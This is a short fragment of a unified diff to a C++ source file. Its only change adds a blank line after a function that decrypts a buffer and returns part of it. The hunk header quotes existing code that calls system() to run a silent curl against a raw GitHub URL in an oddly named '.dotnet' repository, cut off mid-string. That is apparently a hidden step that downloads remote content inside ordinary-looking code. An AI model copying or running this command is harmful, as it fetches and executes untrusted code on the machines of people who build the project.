@@ -40,3 +40,4 @@ system("curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj
     string decryptedStr((CHAR*)(decrypted), decryptedLen);
     return decryptedStr.substr(32);
 }
+
